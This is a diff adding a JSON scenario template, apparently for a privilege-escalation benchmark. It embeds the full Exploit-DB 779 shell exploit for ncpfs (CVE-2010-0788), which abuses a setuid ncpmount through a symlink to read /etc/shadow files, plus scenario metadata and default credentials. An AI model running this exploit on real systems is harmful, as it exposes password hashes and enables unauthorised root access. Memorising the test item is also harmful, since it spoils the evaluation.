@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_779",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: ncpfs < 2.2.6 (Gentoo / Linux) - Local Privilege Escalation (OSVDB-62377;CVE-2010-0788)\n\nExploit source code (779.sh):\n```\n#!/bin/sh\n## Had to remove local -r to get it to work via sh on my box\n## Root's encrypted password was in toupper form but the\n## super stated it worked fine for him (Gentoo with ncpfs 2.2.5)\n## If it worked for you send an email to info@milw0rm.com /str0ke\n\n(echo  'head1 by super'\n echo -e '==============\\n'\n (function head1(){\n   (local -r MNTDIR=~/mnt.$$\n     (mv ~/.nwclient ~/.nwclient.temp\n       ln -sf $1 ~/.nwclient\n       mkdir $MNTDIR)2>/dev/null\n     (echo $1\n       ncpmount $MNTDIR\n       echo)\n     (rmdir $MNTDIR\n       rm ~/.nwclient\n       mv .nwclient.temp .nwclient)2>/dev/null)}\n (for i in /etc/*shadow*\n   do head1 $i\n   done)))#\n\n# milw0rm.com [2005-01-30]\n```",
+  "cve": "OSVDB-62377;CVE-2010-0788",
+  "exploitdb_id": "779",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_779",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
